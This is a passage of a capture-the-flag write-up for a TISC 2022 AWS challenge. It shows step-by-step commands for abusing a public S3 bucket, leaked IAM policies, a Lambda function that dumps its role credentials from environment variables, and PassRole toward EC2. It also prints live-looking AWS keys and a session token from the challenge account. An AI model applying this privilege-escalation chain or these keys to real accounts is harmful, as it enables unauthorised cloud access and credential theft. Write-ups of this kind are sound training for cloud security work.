---
title: "TISC 2022 Level 4B - Cloudynekos"
destription: "A cloud challenge during TISC 2022 that required exploiting multiple insecurely configured AWS services"
date: 2022-09-12T00:04:00+08:00
draft: false
tags:
    - ctf
    - tisc-2022
    - cloud
    - s3
    - lambda
    - aws
    - dynamodb
    - ec2
    - rce
categories:
    - ctf
    - writeup
    - tisc-2022
---

## CloudyNekos Challenge Description
This was a Cloud challenge unlocked at level 4 that was part of the recent [TISC 2022](https://www.csit.gov.sg/events/tisc/tisc-2022) CTF organised by [CSIT](https://www.csit.gov.sg/). TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular cloud challenge.

```
DESCRIPTION
Topic: Cloud

We have received intelligence that Palindrome has started a global computing infrastructure to be made available to its agent to spin up C2 instances. They relied on Cloud Service Providers like AWS to provide computing resources for its agents. They have their own custom built access system e-service portal that generate short-lived credentials for their agents to use their computing infrastructure. It was said that their access system e-service was diguised as a blog site.

We need your help to access their computing resources and exfiltrate any meaningful intelligence for us.

Start here: http://d20whnyjsgpc34.cloudfront.net

*NOTE*: Solving challenge 4B allows you to complete level 4, but unlocks challenge 5B only!
```

## Introduction
The challenge starts off by pointing us towards a domain:
`http://d20whnyjsgpc34.cloudfront.net`. Visiting the website shows you a couple of cute cat images `—ฅ/ᐠ. ̫ .ᐟ\ฅ —`
![cat-image](/images/posts/tisc-2022-level4-cloudfront-site.PNG)

After I finished being distracted by those cats, I noticed the following note in the website source code comments:
```html
<div class="p-5 text-center bg-light">
<!-- Passcode -->
<h1 class="mb-3">Cats rule the world</h1>
<!-- Passcode -->
<!-- 
    ----- Completed -----
    * Configure CloudFront to use the bucket - palindromecloudynekos as the origin
    
    ----- TODO -----
    * Configure custom header referrer and enforce S3 bucket to only accept that particular header
    * Secure all object access
-->
<h4 class="mb-3">—ฅ/ᐠ. ̫ .ᐟ\ฅ —</h4>
</div>
```
So at this there were 2 things I took note of:
- There is a passcode?
- There is a bucket `palindromecloudynekos`

A bucket in Cloud context probably meant an S3 bucket and so I took the liberty to enumerate this particular s3 bucket `palindromecloudynekos` and see if it were publicly accessible and voila, the bucket was indeed publicly accessible and I could indeed run `aws s3 ls` on it!

```bash
└─$ aws s3 ls s3://palindromecloudynekos/
                           PRE api/
                           PRE img/
2022-08-23 09:16:20         34 error.html
2022-08-23 09:16:20       2257 index.html
```

The `api` folder looked interesting and running `aws s3 ls s3://palindromecloudynekos/api/` revealed the existence of a file `notes.txt`.
```bash
└─$ aws s3 ls s3://palindromecloudynekos/api/
2022-08-23 09:16:20        432 notes.txt

```

So lets go ahead and copy the file out and to look at its contents with `aws s3 cp s3://palindromecloudynekos/api/notes.txt . ` and then we would be led to the next hint, an API gateway endpoint:
```
└─$ cat notes.txt 
# Neko Access System Invocation Notes

Invoke with the passcode in the header "x-cat-header". The passcode is found on the cloudfront site, all lower caps and separated using underscore.

https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent

All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.
```
Remember our first clue regarding a passcode? Ahhhh yes, I guess this is where it comes in handy. From the clues it seems like we have to interact with the API gateway with a custom header `x-cat-header: cats_rule_the_world`. Lets make this request into a script and run it to see what we get:
```python
# solve.py
import requests

api_url = "https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent"
headers = {"x-cat-header": "cats_rule_the_world"}
r = requests.get(api_url, headers=headers)
print(r.text)
```
```bash
└─$ python3 solve.py
{"Message": "Welcome there agent! Use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIAQYDFBGMS6NCB2UGD", "Secret_Key": "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"}
```

Turns out interacting with the API gateway with the custom header returns us a set of AWS credentials. So let's go ahead and see what our provided AWS credentials is capable of


## Enumerating AWS Credentials Permissions
When given a set of AWS credentials like this, one of the first things you would like to do is to see what kind of permissions it has access to. In this case I used [enumerate-iam](https://github.com/andresriancho/enumerate-iam) to do my first round of enumeration to see what kind of permissions these set of credentials have access to.
```bash
└─$ python3 enumerate-iam.py --access-key AKIAQYDFBGMS6NCB2UGD --secret-key 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
[INFO] Starting permission enumeration for access-key-id "AKIAQYDFBGMS6NCB2UGD"
[INFO] -- Account ARN : arn:aws:iam::051751498533:user/user-66648ab7e833453d8881002651a45a47
[INFO] -- Account Id  : 051751498533
[INFO] -- Account Path: user/user-66648ab7e833453d8881002651a45a47
[INFO] Attempting common-service describe / list brute force.
[INFO] -- dynamodb.describe_endpoints() worked!
[INFO] -- iam.list_roles() worked!
[INFO] -- iam.list_instance_profiles() worked!
[INFO] -- ec2.describe_route_tables() worked!
[INFO] -- ec2.describe_security_groups() worked!
[INFO] -- ec2.describe_regions() worked!
[INFO] -- ec2.describe_subnets() worked!
[INFO] -- ec2.describe_vpcs() worked!
[INFO] -- sts.get_session_token() worked!
[INFO] -- sts.get_caller_identity() worked!
[INFO] -- ec2.describe_instance_types() worked!
```
From the above, we can see a few interesting permissions related to the provided AWS credentials, namely:
- `ec2.describe_route_tables`: relating to network routing information for gateways and subnets
- `ec2.describe_security_groups`: relating to EC2 security groups created
- `ec2.describe_subnets`: relating to subnets
- `ec2.describe_vpcs`: relating to EC2 VPCs
- `iam.list_roles`: relating to IAM roles that are available
- `iam_list_instance_profiles`: relating to IAM instance profiles.

There were quite a lot of things to go through but lets focus on what's interesting for now:

`aws iam list-roles`: Using this command I got a list of roles that were available, in which 2 of them turned out to be relevant to the challenge:

`ec2_agent_role`:
```json
{
    "Path": "/",
    "RoleName": "ec2_agent_role",
    "RoleId": "AROAQYDFBGMSYSEMEVAEH",
    "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
    "CreateDate": "2022-07-22T09:29:34Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "ec2.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "MaxSessionDuration": 3600
},
```
`lambda_agent_development_role`:
```json
{
    "Path": "/",
    "RoleName": "lambda_agent_development_role",
    "RoleId": "AROAQYDFBGMS2NDQR5JSE",
    "Arn": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
    "CreateDate": "2022-07-22T09:29:34Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "lambda.amazonaws.com"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "MaxSessionDuration": 3600
}
```
Tools like `enumerate-iam` wouldn't be able to tell you if you are able to run commands like `aws iam-list-attached-role-policies`, whereby an additional argument is required (`--role-name` in this case). When dealing with IAM roles, we generally want to see what kind of permissions it has by retrieving a list of policies attached to the role and then enumerating said policies for its permissions.

In short, we want to run 2 commands per AWS IAM role:
1.  `aws iam list-attached-role-policies --role-name <role_name>`
2.  `aws iam get-policy-version --policy-arn <policy_arn> --version-id <version_id>`


Lets go ahead and run these commands for the `ec2_agent_role` and the `lambda_development_agent_role` to see what permissions it has!

`ec2_agent_role`:
```bash
└─$ aws iam list-attached-role-policies --role-name ec2_agent_role                                            255 ⨯
{
    "AttachedPolicies": [
        {
            "PolicyName": "iam_policy_for_ec2_agent_role",
            "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role"
        }
    ]
}

└─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "dynamodb:DescribeTable",
                        "dynamodb:ListTables",
                        "dynamodb:Scan",
                        "dynamodb:Query"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "VisualEditor0"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-07-22T09:29:34Z"
    }
}
```

Woah, permissions to interact with the `dynamodb` service! How about `lambda_agent_development_role`?

```bash
└─$ aws iam list-attached-role-policies --role-name lambda_agent_development_role
{
    "AttachedPolicies": [
        {
            "PolicyName": "iam_policy_for_lambda_agent_development_role",
            "PolicyArn": "arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role"
        }
    ]
}

└─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "ec2:RunInstances",
                        "ec2:CreateVolume",
                        "ec2:CreateTags"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "Sid": "VisualEditor2"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2022-07-22T09:29:36Z"
    }
}
```

Wow, run an ec2 instance!? But wait, before we carry on did you notice that in the `ec2_agent_role`, `IsDefaultVersion` is set to `true` but for `lambda_agent_development_role`, `IsDefaultVersion` is seto to `false`. What does this mean??

Policies in AWS generally have a version tag, and normally it goes `v1`, `v2`, `v3`....etc. Quoting from the AWS documentation: 
`One of the versions of a managed policy is set as the default version. The policy's default version is the operative version—that is, it's the version that is in effect for all of the principal entities (users, user groups, and roles) that the managed policy is attached to.`

Which means that we should enumerate out for the version that has `IsDefaultVersion` set to `true` to get the one in effect! Let's do that for `lambda_agent_development_role` and find a version that has that set

```bash
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "ec2:RunInstances",
                        "ec2:CreateVolume",
                        "ec2:CreateTags"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                },
                {
                    "Action": [
                        "lambda:GetFunction"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service"
                },
                {
                    "Action": [
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "Sid": "VisualEditor2"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-08-23T13:16:26Z"
    }
}
```

Indeed, we notice something new, a `cat-service` function!

Alright we have additional information about these roles but, the question still begets, what can our AWS credentials do? This is where we do some deeper enumeration and run commands like `aws iam list-attached-user-policies` and passing in the appropriate `--user-name` as shown below:

```bash
└─$ aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity | jq .Arn | awk -F'/' '{print $2}' | tr -d '"')
{
    "AttachedPolicies": [
        {
            "PolicyName": "user-66648ab7e833453d8881002651a45a47",
            "PolicyArn": "arn:aws:iam::051751498533:policy/user-66648ab7e833453d8881002651a45a47"
        }
    ]
}
```
```bash
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/user-66648ab7e833453d8881002651a45a47 --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion",
                        "iam:ListAttachedRolePolicies",
                        "iam:ListRoles"
                    ],
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": [
                        "lambda:CreateFunction",
                        "lambda:InvokeFunction",
                        "lambda:GetFunction"
                    ],
                    "Resource": "arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::051751498533:user/${aws:username}"
                },
                {
                    "Sid": "VisualEditor3",
                    "Effect": "Allow",
                    "Action": [
                        "iam:PassRole"
                    ],
                    "Resource": "arn:aws:iam::051751498533:role/lambda_agent_development_role"
                },
                {
                    "Sid": "VisualEditor4",
                    "Effect": "Allow",
                    "Action": [
                        "ec2:DescribeVpcs",
                        "ec2:DescribeRegions",
                        "ec2:DescribeSubnets",
                        "ec2:DescribeRouteTables",
                        "ec2:DescribeSecurityGroups",
                        "ec2:DescribeInstanceTypes",
                        "iam:ListInstanceProfiles"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-09-10T15:52:36Z"
    }
}
```

Oh, so turns out we can create a lambda function and invoke it. Not only that but our lambda function can be created with the `lambda_agent_development_role`!

Before we continue let's take a step back and look back on what we've uncovered so far:

![diagram-1](/images/posts/tisc-2022-level4-diagram-1.jpg)

## Abusing Lambda Functions
Let's look back on our user's policy, specifically the lambda-related permissions:
```json
{
    "Sid": "VisualEditor1",
    "Effect": "Allow",
    "Action": [
        "lambda:CreateFunction",
        "lambda:InvokeFunction",
        "lambda:GetFunction"
    ],
    "Resource": "arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*"
}
```
Notice that our user is able to create/invoke/get lambda functions for functions that start with the `{aws:username}-`. One can get the username for the provided user credentials with the following bash script:
```bash
└─$ cat get_username.sh 
#!/bin/bash

aws sts get-caller-identity | jq .Arn | awk -F'/' '{print $2}' |tr -d '"'
```

In addition, the lambda function that we create would have the `lambda_agent_development_role`. Let's try to create and invoke such a lambda function, whereby our aim is to get a set of temporary AWS IAM credentials that has the `lambda_agent_development_role` role.

### Creating the Lambda Function
The lambda function that we would attempt to create would contain the following arguments:
- `--function-name`: We get the `{aws:username}` and then concatenate an arbitrary name like `-env` to the end of it.
- `--role`: the role would be the `lambda_agent_development_role`
- `--runtime`: we will create a javascript file and therefore use a runtime environment like `nodejs12.x`. 
- `--handler`: `index.handler`. an index.js file would be created and zipped as explained below
- `--zip-file`: a zip file `function.zip` would be created containing an `index.js`, which contains the following piece of code:

```javascript
exports.handler = async function(event, context) {
  console.log("ENVIRONMENT VARIABLES\n" + JSON.stringify(process.env, null, 2))
  console.log("EVENT\n" + JSON.stringify(event, null, 2))
  return context.logStreamName
}
```

Admittedly, all these resources came from the [AWS documentation](https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-awscli.html), and I didn't really have to re-invent the wheel myself too much :)

We then run the `aws lambda create-function`:

```bash
└─$ aws lambda create-function --role arn:aws:iam::051751498533:role/lambda_agent_development_role --function-name $(./get_username.sh)-env --zip-file fileb://function.zip --handler index.handler --runtime nodejs12.x

{
    "FunctionName": "user-59b23d07b5ee4cb2a64d1e481dd4f235-env",
    "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:user-59b23d07b5ee4cb2a64d1e481dd4f235-env",
    "Runtime": "nodejs12.x",
    "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
    "Handler": "index.handler",
    "CodeSize": 322,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2022-09-10T18:11:29.774+0000",
    "CodeSha256": "mh7aiyjDJPgtppb5wSC73zT6O0hWHAeBd9pJAE8UcX4=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "ecd42252-5578-4e2d-bfb5-738369d59009",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    }
}
```

### Invoking the Lambda Function
Alright we successfully created our Lambda function! Now to invoke it! We can use the `aws lambda invoke` command to do so, and with some bash magic, decode our AWS credentials stored in environment variables:

```bash
└─$ aws lambda invoke --function-name $(./get_username.sh)-env out --log-type Tail --query 'LogResult' --output text | base64 -d

<Omitted>
"AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEMr//////////wEaDmFwLXNvdXRoZWFzdC0xIkcwRQIgUt1jikEuqn+cxAsPeJXC7Nv4QNmfediKulRDTIZhQVYCIQCIObdc6xKfutLqHF8n94M6543kSpb3u+mOJknkbqxDoiqsAwhjEAEaDDA1MTc1MTQ5ODUzMyIM7SzDi82+uTMrom7cKokDrwqFKKukPMw4wGtkAxycra51iT6AG8QxtEiNCbqpjkJWbT2sdvzQGj4Z6qOieknM9jQAmwTFq7UKpmGTekpmV7JAXsnCEScNsqlIGoaGUJ/7WEp4I/bK4/ZzxN7hbiva2cTPw+00pOXelh7y0cwV4QtLj6pqEVu2aSUKP6/kBnQc4mfB+WCPUqH6EFP8ZSFP5owM3ZT42AR4oB/FI7IGaw44rIx15vgZznjaWbdZJS7ZgFRNeFTCjnmpGbtB+Rb/u2CScYMmiJ+8f2f+hW+F4paYsB5StsCAQVr3+EjTdWsJXM8zlAzAXcAoQ6xxknYsxaM9xSdXPlBzs03Ec46KmfTzXa1X/p650pXw72B9uZhcwB5XAQ095UFcPBCyn1cGVePmQU05TpPnPDbL1NRXYk8IxWLHqZGwc+HB0Y2TS2AetrYW3U8lIOg6yCksJNlBFd+6qK2i1a7tpi+VsRuabYCSKQoVYCQXFK/agIsCqXU0tM8EhTSZeq9+7zZZw7Slj7eANLki6DU/MM6n85gGOp0BaqMzHU24ojdfKNF1zDG4sMhXEbOHbgrEgWILVl9yet4+n6MSl0LKKTWYhJDaMDy7fBJpfBnaqa018zt8Zcb+VeBvVDg9fn3odkgM7d97NfO0JHtRC34vf9Sm+j6WDD1HW1/ElPKw/PXmFAOk28R0SNseIfl3BVTs4o7CLGo3Qo/k6EojdGouwtZAQZkBCs+L6g19Y1GInbsKZoZChQ==",
"AWS_SECRET_ACCESS_KEY": "qscguTMoPigbpOA8ZqoCDJ7NiLSe3ROHJQlfK/U4",
"AWS_ACCESS_KEY_ID": "ASIAQYDFBGMS6PHR4NFX",
<Omitted>
```

Alright, we now have our set of temporary AWS IAM credentials! Recalling back, this set of permissions should allow us to get the `cat-service` function, lets go ahead and attempt that!

We first set up our new temporary IAM credentials under the profile lambda:

```bash
└─$ cat ~/.aws/credentials
[default]
aws_access_key_id = AKIAQYDFBGMS6OKAFSZK
aws_secret_access_key = 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

[lambda]
aws_access_key_id = ASIAQYDFBGMS6PHR4NFX
aws_secret_access_key = qscguTMoPigbpOA8ZqoCDJ7NiLSe3ROHJQlfK/U4
aws_session_token =  "IQoJb3JpZ2luX2VjEMr//////////wEaDmFwLXNvdXRoZWFzdC0xIkcwRQIgUt1jikEuqn+cxAsPeJXC7Nv4QNmfediKulRDTIZhQVYCIQCIObdc6xKfutLqHF8n94M6543kSpb3u+mOJknkbqxDoiqsAwhjEAEaDDA1MTc1MTQ5ODUzMyIM7SzDi82+uTMrom7cKokDrwqFKKukPMw4wGtkAxycra51iT6AG8QxtEiNCbqpjkJWbT2sdvzQGj4Z6qOieknM9jQAmwTFq7UKpmGTekpmV7JAXsnCEScNsqlIGoaGUJ/7WEp4I/bK4/ZzxN7hbiva2cTPw+00pOXelh7y0cwV4QtLj6pqEVu2aSUKP6/kBnQc4mfB+WCPUqH6EFP8ZSFP5owM3ZT42AR4oB/FI7IGaw44rIx15vgZznjaWbdZJS7ZgFRNeFTCjnmpGbtB+Rb/u2CScYMmiJ+8f2f+hW+F4paYsB5StsCAQVr3+EjTdWsJXM8zlAzAXcAoQ6xxknYsxaM9xSdXPlBzs03Ec46KmfTzXa1X/p650pXw72B9uZhcwB5XAQ095UFcPBCyn1cGVePmQU05TpPnPDbL1NRXYk8IxWLHqZGwc+HB0Y2TS2AetrYW3U8lIOg6yCksJNlBFd+6qK2i1a7tpi+VsRuabYCSKQoVYCQXFK/agIsCqXU0tM8EhTSZeq9+7zZZw7Slj7eANLki6DU/MM6n85gGOp0BaqMzHU24ojdfKNF1zDG4sMhXEbOHbgrEgWILVl9yet4+n6MSl0LKKTWYhJDaMDy7fBJpfBnaqa018zt8Zcb+VeBvVDg9fn3odkgM7d97NfO0JHtRC34vf9Sm+j6WDD1HW1/ElPKw/PXmFAOk28R0SNseIfl3BVTs4o7CLGo3Qo/k6EojdGouwtZAQZkBCs+L6g19Y1GInbsKZoZChQ=="
```

We then run the `aws lambda get-function` command:

```bash
─$ aws --profile lambda --region ap-southeast-1 lambda get-function --function-name cat-service
{
    "Configuration": {
        "FunctionName": "cat-service",
        "FunctionArn": "arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service",
        "Runtime": "python3.9",
        "Role": "arn:aws:iam::051751498533:role/lambda_agent_development_role",
        "Handler": "main.lambda_handler",
        "CodeSize": 416,
        "Description": "",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2022-08-23T13:16:19.469+0000",
        "CodeSha256": "52UWd1KHAZub5aJIS953mHrKVM0mFPiVBuGahWFGaz4=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "90be1b48-3339-4a78-a083-b77e285b7b8a",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/cat-service-f02e065f-3e98-4c04-8d77-c627d6d8d5a2?versionId=XMHQ4OlZGN52Y_FiI23NgMfVyC2eL_sD&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLXNvdXRoZWFzdC0xIkcwRQIgcFR%2ByqeFPsLsztRFsEaIgopn3O%2FbCQ97F4%2FtgRdacQ0CIQDNPJ4PAXpD2t3lwkeU5oDclmHFskzLYBcqDS4oOSmJAyrbBAhiEAQaDDI5NTMzODcwMzU4MyIMOSYKz4ikB%2FBj%2B%2FM2KrgELWb0iH%2BJs3xS4ntDTYKOgC0o707KUG77Mr5wTSvf2X8D85DmEofY%2BJt3E9BTji6Z%2BSgi6XDnavRmB%2BU9Bep9IJch1KDXpyhME%2FCU3TgmilFuifG4RMXE6G%2B1fQoAx3YzT7IGnrBDaNKDZahLIN0dBivAIr%2BdTO%2FodtdSzII66w4FvTT2EDeNpRogrdoCsTU0YyhsersYI26vHqEtRvQAoEZdv94tWfg0Q5ZoKJyHX7f7Ta5BNvl2pgSRIT84GD%2BXZqbPQ%2BjEcNaFGE4HDg1m%2BBpclTwYIW%2FNWFHf47RO%2BFFpkCPJfAohxIM2LnZrH9nZM9Fjcm4XFHwcdHsip4JG762UJQnWGsG9DD9xWhl3pMAYI%2B6u3skDKC42YZtg12WvxSaDDT3YmoPFv6%2FSapmZCSGbvuBXdkwz9wI%2FGe6MLDchr%2FCrfAGb9WJc4X%2BvVR%2FJhcNAoL2bIby43pTpXLSRWIT%2FZoXES5Ly0P05kFvNFxZkTrvXEAWLsrV53ShhO7kgJSWzvY0g%2F4%2B5EuulEiMkapp2F2FMo3aDcfKB8uCvQB0L0WouqtKlOE5Mqhy0C%2Bxq7LwEDGTSvoYPbe%2BvWcjWuGXIlQMmNEjhY%2F2aB1JOrKfkGsj3nr0li8LQeGokQuQZF7dunDnfdiR8hgg4qiWygMUEKz60s%2By23w6XGRHoqEGVT9N8NykpCsiqbb0MbwVEqwS5wF67mSFcEStxaD7hqeoxpAx6rAoZm1PKp%2F0844rX38Rpo2%2F7czC2l%2FOYBjqpAdgVxmoBzKoXM2%2FWlUi6yc19yOwnATeAuDM33gHlKNJvbiGCIY9CgvDWxVNGeh5I6m2ZbPtQzFBGmkuFHVUAnkCwLLutv%2FD%2F%2FbgtCUYiuVYo9bGoMSXZg85f27ik2d4BfuF%2Byd4WJxjBqrYKCfWWyCFAgLtLvFL8FeEQvaG0QT8TCyxUzGaGhKhrYpnsN43p7B8xSu%2BfMctTiF1vRTSHUi7sHMxAFddWlAE%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20220910T181953Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAUJQ4O7LP5TW7TD4A%2F20220910%2Fap-southeast-1%2Fs3%2Faws4_request&X-Amz-Signature=c155a8c3de9346b2327fe9c053e01bc10e3304204b4ce81557d10eb349a38d08"
    }
}
```

Oh, an interesting domain! Accessing the domain would bring us to a zip file when unzipped reveal a `main.py` file that contains the following piece of code:

```python
import boto3

def lambda_handler(event, context):
    
    # Work in Progress: Requires help from Agents! 
    
    # ec2 = boto3.resource('ec2')

    # instances = ec2.create_instances(
    #    ImageId="???",
    #    MinCount=1,
    #    MaxCount=1,
    #    InstanceType="t2.micro"
    #)
    
    return {
        'status': 200,
        'results': 'This is work in progress. Agents, palindrome needs your help to complete the workflow! :3'
    }
```

Based on this hint, it seems like the next step is to actually create and run an EC2 instance! Now let's take a step back and see what we just did so far

![diagram-2](/images/posts/tisc-2022-level4-diagram-2.jpg)


(During the actual CTF I actually created a reverse shell into the temporary Lambda instance. It was unnecessary but I thought it was cool to point out that it is indeed possible to execute arbitary code on the Lambda instance, and create a reverse shell although what you can do on the instance is kind of limited and for the purpose of this CTF, you really only want the temporary AWS IAM keys).

## Running an EC2 Instance
At this junction, our goal is to not just run any EC2 instance, but if you recall earlier on, the `ec2_agent_role` has permissions to interact with the `dynamodb` service. Let's take a look once again at what permissions the `lambda_development_agent_role` has:

```json
{
    "Action": [
        "ec2:RunInstances",
        "ec2:CreateVolume",
        "ec2:CreateTags"
    ],
    "Effect": "Allow",
    "Resource": "*"
},
{
    "Action": [
        "iam:PassRole"
    ],
    "Effect": "Allow",
    "Resource": "arn:aws:iam::051751498533:role/ec2_agent_role",
    "Sid": "VisualEditor2"
}
```

So, not only can it run EC2 instances but it also has the ability to pass on the `ec2_agent_role` on to the EC2 instance created, which is exactly what we need! In the context of EC2 instances, one can't simply attach a "role" to an EC2 instance like this. If one wished to give a role to an EC2 instance, one would have to create an EC2 instance profile and attach said profile to the EC2 instance.

If we recall, our initial user credentials had the permissions to run the `aws iam list-instance-profiles`, and if we ran that command, we would indeed see an instance profile `ec2_agent_instance_profile` that has the `ec2_agent_role` attached to it already:

```bash
└─$ aws iam list-instance-profiles                                                              
{
    "InstanceProfiles": [
        {
            "Path": "/",
            "InstanceProfileName": "ec2_agent_instance_profile",
            "InstanceProfileId": "AIPAQYDFBGMS6EKSSQ2RF",
            "Arn": "arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile",
            "CreateDate": "2022-07-22T09:29:35Z",
            "Roles": [
                {
                    "Path": "/",
                    "RoleName": "ec2_agent_role",
                    "RoleId": "AROAQYDFBGMSYSEMEVAEH",
                    "Arn": "arn:aws:iam::051751498533:role/ec2_agent_role",
                    "CreateDate": "2022-07-22T09:29:34Z",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "ec2.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }
                }
            ]
        }
    ]
}
```

Nice! But wait, there's more. If we recall our initial enumeration, the `notes.txt` gave us a message:
`All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.`

So this means that when we create our ec2 instance, we would have to create with a tag `{Key=agent,Value={aws:username}}`.

In addition, we would also need to specify which subnet and attach any relevant security groups to the EC2 instance, along with specifying an AMI. I guess this is where the initial permissions of being able to run `aws ec2 describe-security-groups` and `aws ec2 describe-subnets` come in handy since these are the 2 key pieces of information we want for this part of the challenge:

```bash
└─$ aws ec2 describe-subnets                                                                                  255 ⨯
{
    "Subnets": [
        {
            "AvailabilityZone": "ap-southeast-1a",
            "AvailabilityZoneId": "apse1-az2",
            "AvailableIpAddressCount": 16379,
            "CidrBlock": "10.0.0.0/18",
            "DefaultForAz": false,
            "MapPublicIpOnLaunch": true,
            "MapCustomerOwnedIpOnLaunch": false,
            "State": "available",
            "SubnetId": "subnet-0aa6ecdf900166741",
            "VpcId": "vpc-095cd9241e386169d",
            "OwnerId": "051751498533",
            "AssignIpv6AddressOnCreation": false,
            "Ipv6CidrBlockAssociationSet": [],
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "palindrome"
                }
            ],
            "SubnetArn": "arn:aws:ec2:ap-southeast-1:051751498533:subnet/subnet-0aa6ecdf900166741",
            "EnableDns64": false,
            "Ipv6Native": false,
            "PrivateDnsNameOptionsOnLaunch": {
                "HostnameType": "ip-name",
                "EnableResourceNameDnsARecord": false,
                "EnableResourceNameDnsAAAARecord": false
            }
        }
    ]
}
```

```bash
└─$ aws ec2 describe-security-groups
{
    "SecurityGroups": [
        {
            "Description": "Access to c2 infra",
            "GroupName": "default-agents-sg",
            "IpPermissions": [
                {
                    "FromPort": 0,
                    "IpProtocol": "tcp",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "ToPort": 65535,
                    "UserIdGroupPairs": []
                }
            ],
            "OwnerId": "051751498533",
            "GroupId": "sg-047c958320ee832f0",
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "VpcId": "vpc-095cd9241e386169d"
        },
        <Omitted>
```

So to summarise, we want to attach the following pieces of information to our ec2 instance:
